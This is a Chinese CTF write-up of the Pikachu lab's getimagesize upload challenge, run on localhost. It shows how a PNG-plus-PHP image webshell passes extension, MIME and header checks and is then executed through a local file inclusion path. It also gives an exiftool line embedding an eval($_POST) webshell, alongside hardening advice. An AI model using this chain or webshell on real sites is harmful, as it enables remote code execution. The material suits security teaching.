---
layout: post
title: Pikachu - Unsafe Fileupload getimagesize Writeup（图片马 + 文件包含）
platform: pikachu
date: 2026-10-29 20:27:00 +0800
categories: CTF
---

Pikachu - Unsafe Fileupload getimagesize Writeup（图片马 + 文件包含）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Unsafe Fileupload → getimagesize()
- 地址：`http://localhost/pikachu/vul/unsafeupload/getimagesize.php`
- 题型：Web
- 考点：**图片马**、getimagesize 的局限、**上传 + 包含的组合链**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
上传目录：D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\年\月\日\
访问 URL：http://localhost/pikachu/vul/unsafeupload/uploads/<年>/<月>/<日>/<随机名>.png
```

**页面形态**：

```text
这里只允许上传图片，不要乱搞!

[选择文件] 未选择文件
[开始上传]
```

**作者提示**：

```html
data-content="getimagesize了解一下"
```

**✅ 实测结果（4 种文件）**

| # | 文件名 | 内容 | 结果 |
|---|---|---|---|
| 1 | `pure.php` | `<?php echo "PURE_PHP"; ?>` | ❌ **卡在扩展名**：`上传文件的后缀名不能为空，且必须是jpg,jpeg,png中的一个` |
| 2 | **`fake.png`** | **纯 PHP**（`Content-Type: image/png`）| ❌ **卡在 getimagesize**：**`你上传的是个假图片，不要欺骗我！`** |
| 3 | `real.png` | 真 1x1 PNG（51 字节）| ✅ `uploads/2026/10/29/5099556ae33af84722c767399819.png` |
| 4 | **`horse.png`** | **PNG 头 + PHP 尾巴**（81 字节）| **✅ `uploads/2026/10/29/7590456ae33b065a134060595647.png`** |

**★ 第 2 行是"getimagesize 真的在工作"的铁证**：

```
扩展名 .png     ✅ 过了（白名单里有 png）
MIME image/png  ✅ 过了（客户端可控）
getimagesize    ❌ 失败（内容不是真图片）
→ "你上传的是个假图片，不要欺骗我！"
```

**★ 图片马的两个阶段（关键对比）**：

| 操作 | 结果 |
|---|---|
| **直接访问** `uploads/2026/10/29/759045...png` | HTTP 200，**81 字节**，`Content-Type: image/png`，**原文含 `<?php`**（★ 没执行）|
| **用 LFI 包含** `fi_local.php?filename=../../unsafeupload/uploads/2026/10/29/759045...png` | HTTP 200，**执行结果 `HORSE_EXEC_OK`**，页面里**没有** `<?php`（★ 被执行了）|

二、题目分析

**① 源码：三重校验 + 重命名**

```php
<?php
// getimagesize.php 第 18-29 行
if(isset($_POST['submit'])){
    $type = array('jpg', 'jpeg', 'png');                        // ★ 扩展名白名单
    $mime = array('image/jpg', 'image/jpeg', 'image/png');      // ★ MIME 白名单
    $save_path = 'uploads' . date('/Y/m/d/');                   // ★ 按日期分目录
    $upload = upload('uploadfile', '512000', $type, $mime, $save_path);
    if($upload['return']){
        $html .= "<p class='notice'>文件上传成功</p>
                  <p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
    }else{
        $html .= "<p class=notice>{$upload['error']}</p>";
    }
}
?>
```

```php
<?php
// inc/uploadfunction.php — upload() 函数（6 道检查）
function upload($key, $size, $type = array(), $mime = array(), $save_path) {

    // ① 检查上传错误码
    if(!isset($_FILES[$key]['error'])){ ... }
    if($_FILES[$key]['error'] != 0){ ... }

    // ② 检查"是不是通过 HTTP POST 上传的"（防止伪造 $_FILES）
    if(!is_uploaded_file($_FILES[$key]['tmp_name'])){
        $return_data['error'] = '您上传的文件不是通过 HTTP POST方式上传的！';
        return $return_data;
    }

    // ③ ★ 校验扩展名（转小写后比对白名单）
    $arr_filename = pathinfo($_FILES[$key]['name']);
    if(!isset($arr_filename['extension'])) $arr_filename['extension'] = '';
    if(!in_array(strtolower($arr_filename['extension']), $type)){
        $return_data['error'] = '上传文件的后缀名不能为空，且必须是' . implode(',', $type) . '中的一个';
        return $return_data;
    }

    // ④ 校验 MIME（作者注释：MIME类型可以被绕过）
    if(!in_array($_FILES[$key]['type'], $mime)){
        $return_data['error'] = '你上传的是个假图片，不要欺骗我xxx！';
        return $return_data;
    }

    // ⑤ ★★ 校验内容（作者注释：还是可以被绕过的）
    if(!getimagesize($_FILES[$key]['tmp_name'])){
        $return_data['error'] = '你上传的是个假图片，不要欺骗我！';
        return $return_data;
    }

    // ⑥ 校验大小（≤ 512000 字节）
    if($_FILES[$key]['size'] > $size){
        $return_data['error'] = '上传文件的大小不能超过' . $size . 'byte(500kb)';
        return $return_data;
    }

    // ⑦ ★ 重命名（随机名 + 保留原扩展名）
    $new_filename = str_replace('.', '', uniqid(mt_rand(100000, 999999), true));
    $arr_filename['extension'] = strtolower($arr_filename['extension']);
    $new_filename .= ".{$arr_filename['extension']}";

    if(!move_uploaded_file($_FILES[$key]['tmp_name'], $save_path . $new_filename)){ ... }

    $return_data['save_path'] = $save_path . $new_filename;
    $return_data['filename']  = $new_filename;
    return $return_data;
}
?>
```

**★ 作者在注释里已经把"答案"写出来了**：

```php
//验证MIME类型，MIME类型可以被绕过
//通过getimagesize来读取图片的属性，从而判断是不是真实的图片，还是可以被绕过的
```

**★ 六道检查的"强度"对比**：

| # | 检查 | 能不能绕 | 怎么绕 |
|---|---|---|---|
| ① | 错误码 | — | 正常上传即可 |
| ② | `is_uploaded_file` | ❌ 绕不了 | 它检查"真的是 HTTP 上传的临时文件"（服务端可信）|
| ③ | **扩展名白名单** | ⚠️ 部分 | 只能传 jpg/jpeg/png（但也够了）|
| ④ | **MIME 白名单** | ✅ **随便绕** | 伪造 Content-Type |
| ⑤ | **getimagesize** | ✅ **做图片马** | 真图片头 + PHP 尾巴 |
| ⑥ | 大小 | — | 图片马很小 |

**★ 关键结论**：

```
前三个"格式类"的检查（扩展名 / MIME / 内容）
★ 都只能防住"纯 PHP 文件"
★ 防不住"图片马"（既是图片，又是 PHP）

★ 因为"检查的是不同维度"：
    扩展名 → 看文件名
    MIME   → 看请求头
    getimagesize → 看文件头
★ 而图片马把"三个维度"都满足了
```

**② ⭐ getimagesize 的原理与局限**

**★ `getimagesize()` 做了什么**：

```php
$info = getimagesize($_FILES['uploadfile']['tmp_name']);
// 成功返回数组：
// [
//    0 => 宽度(px),
//    1 => 高度(px),
//    2 => IMAGETYPE_PNG,      ← ★ 类型常量
//    3 => 'width="1" height="1"',
//    'mime' => 'image/png'
// ]
// 失败返回 false
```

**★ 它怎么判断"是图片"？**

```
读文件【开头几个字节】→ 匹配"魔数（Magic Number）"

PNG : 89 50 4E 47 0D 0A 1A 0A
JPEG: FF D8 FF
GIF : 47 49 46 38 39 61  ("GIF89a")
BMP : 42 4D              ("BM")
```

**★ 它的局限（本关利用的点）**：

```
getimagesize 只看【文件头】
→ 文件头是 PNG → 判定"是 PNG"
→ 至于文件【后面】有什么，它完全不看
★ 所以"PNG 头 + PHP 代码"能同时满足它和 PHP 解释器
```

**★ 这就是"图片马"（Image Horse）的本质**：

```
[真图片] + [PHP 代码]
    ↑            ↑
getimagesize   PHP 执行时
   看这里        看这里（扫描全文）
★ 两个检查"看的地方"不一样 → 都能过
```

**③ ⭐ 上传成功 ≠ 能执行（本关最关键的一步）**

**★ 实测：直接访问上传的 `.png`**：

```
GET http://localhost/pikachu/vul/unsafeupload/uploads/2026/10/29/759045...png
→ HTTP 200
→ 81 字节（= 整个文件大小）
→ Content-Type: image/png
→ 原文含 '<?php' : True          ★ 源码被原样输出
→ 没执行！
```

**★ 为什么？**

```
扩展名是 .png
→ Apache 的配置：只有 .php 才交给 PHP 解析
→ .png 当"静态图片"发出去
★ 所以"图片马"单独存在时，是"死的"
```

**★ 这就是为什么"文件上传"经常需要"配合"**：

```
上传本身只是"把文件放上去"
要让它"执行"，还需要另一个条件：
    ① 上传目录本身能执行 PHP（比如允许 .php 后缀）
    ② 或者有"文件包含"漏洞，把图片马"包含"进来
    ③ 或者利用"解析漏洞"（Apache 多后缀 / Nginx 路径信息）
```

**★ 本关走的是第 ② 条**：

```
上传图片马（过三重校验）
    ↓
得到 uploads/2026/10/29/xxx.png
    ↓
用 File Inclusion 包含它
    ↓
PHP 解释器扫描全文 → 执行 PHP 尾巴 → RCE ✅
```

**★ 实测包含结果**：

```
GET http://localhost/pikachu/vul/fileinclude/fi_local.php
    ?filename=../../unsafeupload/uploads/2026/10/29/759045...png
    &submit=提交

→ HTTP 200
→ 执行结果: HORSE_EXEC_OK
→ 页面里还有 '<?php' 吗: False       ★ 被解释了，只剩输出
```

**④ 路径计算：LFI 那一半怎么数**

**★ LFI 的起点**：

```php
// fi_local.php
include "include/$filename";
```
```
cwd = D:\phpstudy_pro\WWW\pikachu\vul\fileinclude\
实际包含路径 = D:\phpstudy_pro\WWW\pikachu\vul\fileinclude\include\{payload}
```

**★ 目标**：

```
D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\2026\10\29\xxx.png
```

**★ 数层级**：

```
include\            ← 起点
../                 → fileinclude\
../                 → vul\
unsafeupload/...    → vul\unsafeupload\...     ✅ 2 个 .. 够了
```

**★ 所以 payload**：

```
../../unsafeupload/uploads/2026/10/29/<随机名>.png
```

**★ 实测成功。**

**⑤ 一个"意外"：随机重命名反而帮了攻击者**

**★ 代码做了重命名**：

```php
$new_filename = str_replace('.', '', uniqid(mt_rand(100000, 999999), true));
$new_filename .= '.' . strtolower($arr_filename['extension']);
// 形如：7590456ae33b065a134060595647.png
```

**★ 看起来是"防御"**：

```
攻击者不知道文件名 → 无法访问
★ 这是常见的"上传防护"思路
```

**★ 但本关的响应直接泄露了路径**：

```
<p class='notice'>文件保存的路径为：uploads/2026/10/29/7590456ae33b065a134060595647.png</p>
```

**★ 所以"重命名"完全失效**：

```
攻击者从响应里直接拿到文件名
→ 可以访问、可以包含
★ 重命名只在"不泄露路径"时有意义
```

**★ 一个对比**：

| 做法 | 效果 |
|---|---|
| 重命名 + **不泄露路径** | ✅ 有效（攻击者不知道去哪访问）|
| 重命名 + **响应里告诉你路径** | ❌ 无效（本关）|
| 重命名 + 路径在日志里泄露 | ⚠️ 弱（要看日志权限）|
| 重命名 + 路径可爆破 | ⚠️ 弱（随机名足够长就还好）|

**★ 顺便：`uniqid()` 的"随机性"其实不强**：

```
uniqid() 基于"当前微秒时间戳"
mt_rand(100000,999999) 是伪随机
★ 如果攻击者知道"大概的上传时间"
★ 理论上可以爆破（但范围仍然很大）
★ 所以"重命名"的强度取决于"随机源的质量"
```

三、解题步骤

**第 1 步：先体验"三重校验"**

**★ ① 传一个 `.php`**：

```
选 1.php → 上传
→ ❌ "上传文件的后缀名不能为空，且必须是jpg,jpeg,png中的一个"
★ 卡在扩展名校验
```

**★ ② 把 1.php 改名 1.png，但内容还是 PHP**：

```
选 1.png → 上传
→ ❌ "你上传的是个假图片，不要欺骗我！"
★ 卡在 getimagesize
```

**★ 这两步让你确认"扩展名 + 内容"都被检查了。**

**第 2 步：⭐ 制作图片马**

**★ 方法 A：PowerShell 拼接（用现成的 png）**

```powershell
# 1) 找一个真 PNG（比如刚上传成功的那张）
$png = "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\2026\10\29\5099556ae33af84722c767399819.png"

# 2) 准备 PHP 代码
$code = '<?php echo "HORSE_EXEC_OK"; ?>'

# 3) 拼起来
$horse = [System.IO.Path]::Combine($env:TEMP, "horse.png")
[System.IO.File]::WriteAllBytes(
    $horse,
    [System.IO.File]::ReadAllBytes($png) + [System.Text.Encoding]::UTF8.GetBytes($code)
)
Write-Output "已生成: $horse  ($((Get-Item $horse).Length) 字节)"
```

**★ 方法 B：Python**

```python
PNG = open("real.png", "rb").read()
CODE = b'<?php echo "HORSE_EXEC_OK"; ?>'
open("horse.png", "wb").write(PNG + CODE)
```

**★ 方法 C：手工造一个最小的 PNG（我就是这么做的）**

```python
PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000a49444154789c6300010000050001"
)
# 这是 51 字节的合法 1x1 PNG
horse = PNG + b'<?php echo "HORSE_EXEC_OK"; ?>'
# 总大小 81 字节
```

**★ 验证图片马"还是图片"**：

```powershell
# Windows 的"属性"里能看到它是 PNG，能正常预览
# 因为文件头没变
```

**第 3 步：上传图片马**

```
① 在 getimagesize.php 页面选 horse.png
② 点"开始上传"
③ 看到：
   文件上传成功
   文件保存的路径为：uploads/2026/10/29/7590456ae33b065a134060595647.png
④ ★ 复制这个路径（后面要用）
```

**★ 实测成功。**

**第 4 步：验证"直接访问不执行"**

**★ 浏览器访问**：

```
http://localhost/pikachu/vul/unsafeupload/uploads/2026/10/29/7590456ae33b065a134060595647.png
```

**★ 结果**：

```
· 浏览器显示一张 1x1 的空白图（或者是破图图标）
· F12 网络 → 看响应：
    Content-Type: image/png
    响应 81 字节
    ★ 内容是 PNG 二进制 + <?php ... ?> 原文
★ PHP 没有执行
```

**第 5 步：⭐ 用文件包含执行**

**★ 地址栏粘**（注意路径）：

```
http://localhost/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2026/10/29/7590456ae33b065a134060595647.png&submit=提交
```

**★ 预期结果**：

```
HORSE_EXEC_OK
```

**★ 实测成功 ✅**

**★ 到这里，"上传 + 包含"的完整链就打通了**：

```
上传图片马 → 得到路径 → LFI 包含 → 代码执行
```

**第 6 步：清理（需要管理员权限）**

```powershell
# 管理员 PowerShell
Remove-Item "D:\phpstudy_pro\WWW\pikachu\vul\unsafeupload\uploads\*" -Recurse -Force
```

**★ 为什么要管理员**：

```
上传的文件所有者是 BUILTIN\Administrators
（phpstudy 用高权限跑 Apache）
→ 普通用户 cecilia 只有 ReadAndExecute → 删不掉
```

**第 7 步：完整 payload 汇总**

```
// ========== 被拒绝的 ==========
1.php（纯 PHP）              → 卡扩展名
1.png（内容纯 PHP）           → 卡 getimagesize
1.gif（真 GIF）               → 卡扩展名（白名单没有 gif）

// ========== 能过校验的 ==========
真 PNG                        → 上传成功
图片马（PNG 头 + PHP 尾巴）    → 上传成功 ✅

// ========== 执行（配合 LFI）==========
http://localhost/pikachu/vul/fileinclude/fi_local.php
    ?filename=../../unsafeupload/uploads/<年>/<月>/<日>/<随机名>.png
    &submit=提交
```

四、延伸知识

**① 图片马的三种做法**

**做法 1：追加（最简单，本关用的）**

```
[真图片字节] + [<?php ... ?>]
★ getimagesize 只看头部 → 通过
★ PHP 扫描全文 → 执行
★ 缺点：文件末尾多了代码，某些校验（如二次渲染）会把它去掉
```

**做法 2：藏在 EXIF 注释里**

```
用 exiftool 把 PHP 代码写进图片的 Comment / Artist 字段：
    exiftool -Comment='<?php @eval($_POST[cmd]);?>' shell.png
★ 优点：文件结构仍然完整，图片能正常显示
★ 缺点：需要 include 时能执行（有些场景 PHP 读不到 EXIF）
```

**做法 3：藏在 IDAT 块里（针对二次渲染）**

```
· 把 PHP 代码"塞进"图片像素数据的一个 IDAT 块
· 用脚本（如"二次渲染绕过脚本"）生成
★ 目的：即使服务器"重新渲染图片"，代码也能保留下来
★ 这是"二次渲染"那一关的核心技巧
```

**② getimagesize 的三个"近亲"及其绕过**

| 函数 | 检测什么 | 能否绕过 |
|---|---|---|
| `getimagesize()` | 文件头魔数 | ✅ 图片马 |
| `finfo_file()` | 文件头魔数（更准）| ✅ 图片马 |
| `exif_imagetype()` | 文件头魔数 | ✅ 图片马 |
| `imagecreatefrompng()` | **能否成功解码整张图** | ⚠️ 更难（见下）|

**★ `imagecreatefrompng()` 的区别**：

```
它不只是"看文件头"，而是"真的把整个图片解码出来"
→ 文件尾部的 PHP 代码会被丢弃
→ 图片马会失效

★ 但攻击者还有"二次渲染绕过"（下一关会讲）
```

**③ "上传 + 包含"是经典的组合链**

**★ 为什么这个组合这么常用？**

```
单独"上传"可能失败：
    · 上传目录不在 Web 根目录 → 访问不到
    · 上传目录禁止执行 PHP → 不执行
    · 后缀被强制改成 .jpg → 不执行

但"上传 + 包含"就能绕过这些限制：
    · 图片马传到哪不重要（有 LFI 就行）
    · 后缀是什么不重要（include 不看后缀）
    · 只要能"读"到那个文件，就能"执行"它
```

**★ 一个完整的攻击链示例**：

```
① 发现上传点（getimagesize 校验）
② 制作图片马（PNG + PHP）
③ 上传成功，拿到路径
④ 发现 LFI（fi_local.php）
⑤ 用 LFI 包含图片马
⑥ 代码执行 → getshell
⑦ 上传一个"功能更全"的 webshell（或直接用它）
```

**★ 这个链在 CTF 和实战中都非常常见。**

**④ 为什么"随机重命名"经常救不了场**

**★ 重命名的目的是"让攻击者猜不到路径"。**

**★ 但以下情况会泄露路径**：

```
① 响应里直接告诉你（本关）❌
② 页面里"回显"图片 → img src="/uploads/xxx.png"  ❌
③ 下载功能的链接里 ❌
④ 日志里（如果攻击者有日志读权限）⚠️
⑤ 文件名可预测（时间戳 / 自增 ID / md5(原文件名)）⚠️
⑥ 目录可列（Apache 的 Autoindex On）⚠️
```

**★ 一个常见的"错误做法"**：

```php
$new_name = md5($_FILES['f']['name']);      // ★ 基于原文件名
// 攻击者知道"原文件名" → 算出新名字 → 完全可预测
```

**★ 正确做法**：

```php
$new_name = bin2hex(random_bytes(16)) . '.' . $safe_ext;
// ★ 用加密安全的随机源（random_bytes）
// ★ 不基于任何用户输入
// ★ 并且响应里不要回显完整路径
```

**⑤ "上传目录禁止执行"为什么是最终防线**

**★ 回到本关的"直接访问"实验**：

```
访问 .png → Content-Type: image/png → 原样输出
★ 因为 Apache 只把 .php 交给 PHP 解析
```

**★ 如果攻击者传的是 `.php`（前两关的情况）**：

```
访问 .php → Content-Type: text/html → PHP 执行
★ 因为 .php 被解析
```

**★ 所以"禁止执行"的配置是**：

```nginx
# 上传目录里，任何 .php 都不许执行
location ^~ /uploads/ {
    location ~ \.php$ { deny all; }
}
```

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    <FilesMatch "\.(php|phtml|php3|php4|php5|phar)$">
        Require all denied
    </FilesMatch>
</Directory>
```

**★ 但注意**：

```
"禁止执行"防得住"直接访问执行"
★ 防不住"LFI 包含"（因为 include 是"读文件"，不是"HTTP 请求"）
★ 所以还必须修 LFI
```

**★ 这就是"纵深防御"**：

```
· 上传校验（扩展名 + 内容 + 重命名 + 不泄露路径）
· 上传目录禁止执行
· 修复文件包含漏洞
· open_basedir 限制
★ 每一层都能独立削弱攻击链
```

**⑥ 本模块的进度对照（7 关的"防线演进"）**

| # | 关卡 | 校验 | 绕过 | 本关关键点 |
|---|---|---|---|---|
| 1 | client check | 前端 JS | 直接发请求 | 前端不可靠 |
| 2 | MIME type | 服务端 MIME | 伪造 Content-Type | 标签≠内容 |
| 3 | **getimagesize** | **服务端内容** | **图片马** | **看头不看尾** |
| 4 | 后缀黑名单 | 后缀（黑） | 大小写/双写/点空格 | 黑名单必败 |
| 5 | 后缀白名单 | 后缀（白） | 解析漏洞 | 白名单也可能被绕 |
| 6 | 二次渲染 | 重新渲染图片 | 在像素里藏代码 | 最难的一关 |
| 7 | 条件竞争 | 先传后删 | 抢时间窗口 | 并发利用 |

**★ 演进逻辑**：

```
前端 → 服务端 MIME → 服务端内容 → 后缀黑名单 → 后缀白名单 → 二次渲染 → 条件竞争
★ 校验越来越强，绕过越来越难
★ 但"上传目录禁止执行"始终是最终防线
```

五、总结

- **本题核心：`getimagesize()` 只看文件头 → 做"图片马"就能过；上传后 `.png` 不被执行 → 用"文件包含"把它包含进来执行。**

- **三段关键代码**：

```php
// ① 三重校验
if(!in_array(strtolower($arr_filename['extension']), $type)){ die('扩展名不对'); }   // 扩展名
if(!in_array($_FILES[$key]['type'], $mime)){ die('假图片'); }                        // MIME
if(!getimagesize($_FILES[$key]['tmp_name'])){ die('你上传的是个假图片，不要欺骗我！'); }  // 内容

// ② 重命名（但不保密路径）
$new_filename = str_replace('.', '', uniqid(mt_rand(100000,999999), true));
$new_filename .= '.' . strtolower($arr_filename['extension']);

// ③ 响应里泄露路径
$html .= "文件保存的路径为：{$upload['save_path']}";
```

- **⭐ 八个必记要点**：

```text
① getimagesize 只看文件头
   PNG 魔数 89 50 4E 47 0D 0A 1A 0A
   → 文件头是 PNG 就判定"是 PNG"
   → 文件后面有什么它不管

② 图片马 = 真图片 + PHP 代码
   [PNG 字节] + [<?php ... ?>]
   ★ 两个检查"看的地方"不一样，所以都能过

③ 上传成功 ≠ 能执行
   .png 不会被 Apache 当 PHP 解析
   → 直接访问只是"原样输出源码"
   ★ 必须配合"文件包含"或"解析漏洞"

④ 上传 + 包含 = 经典组合链
   ① 上传图片马（过校验）
   ② 拿到路径
   ③ LFI 包含它
   ④ PHP 扫描全文 → 执行尾巴 → RCE

⑤ 路径计算（本关）
   LFI 起点：vul\fileinclude\include\
   目标：vul\unsafeupload\uploads\年\月\日\xxx.png
   → ../../unsafeupload/uploads/...

⑥ 随机重命名没用（因为响应泄露路径）
   代码重命名了，但响应里写着"路径为：uploads/..."
   ★ 重命名只在"不泄露路径"时才有意义

⑦ 作者注释已经点破了答案
   "MIME类型可以被绕过"
   "通过getimagesize...还是可以被绕过的"
   ★ 读源码注释是做题的第一步

⑧ 最终防线：上传目录禁止执行
   即使图片马传上去了
   如果包含漏洞也被修了 → 攻击链断裂
```

- **实测数据**：

```text
pure.php（纯 PHP）              → ❌ 上传文件的后缀名不能为空，且必须是jpg,jpeg,png中的一个
fake.png（内容是纯 PHP）        → ❌ 你上传的是个假图片，不要欺骗我！   ★ getimagesize 生效
real.png（真 1x1 PNG，51 字节）  → ✅ uploads/2026/10/29/5099556ae33af84722c767399819.png
horse.png（PNG 头 + PHP 尾巴）   → ✅ uploads/2026/10/29/7590456ae33b065a134060595647.png

直接访问 horse.png：
    HTTP 200 | 81 字节 | Content-Type: image/png | 原文含 '<?php' = True   ★ 没执行

LFI 包含 horse.png：
    fi_local.php?filename=../../unsafeupload/uploads/2026/10/29/759045...png
    → 执行结果: HORSE_EXEC_OK
    → 页面里还有 '<?php' 吗: False    ★ 执行了
```

- **进度**：

```text
platform: pikachu   34 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
└── Unsafe Fileupload   3/7    ← 前端/MIME/getimagesize 完成，还剩 4 关
```

**手工复现要点**：

```text
· 传 1.php → 卡扩展名
· 传 1.png（纯 PHP 内容）→ 卡 getimagesize（"不要欺骗我"）
· 造图片马：真 PNG + <?php echo "HORSE_EXEC_OK"; ?>
· 上传 → 拿到路径 uploads/2026/10/29/xxx.png
· 直接访问 → 只是图片，源码原样输出
· 用 LFI 包含：../../unsafeupload/uploads/2026/10/29/xxx.png → HORSE_EXEC_OK
· 管理员 PowerShell 清理 uploads
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  图片马 = 既是图片，又是 PHP                                   │
│                                                            │
│  [PNG 头 + 图片数据] + <?php ... ?>                          │
│      ↓                      ↓                             │
│  getimagesize 通过       PHP 执行时执行                       │
│                                                            │
│  ★ 上传成功 ≠ 能执行（.png 不被解析）                          │
│  ★ 必须配合"文件包含"或"解析漏洞"                              │
│                                                            │
│  完整链：                                                    │
│      造图片马 → 上传 → 拿路径 → LFI 包含 → RCE                 │
│                                                            │
│  ★ 随机重命名没用，因为响应泄露路径                             │
│  ★ 最终防线：上传目录禁止执行 + 修复 LFI                        │
└────────────────────────────────────────────────────────────┘
```
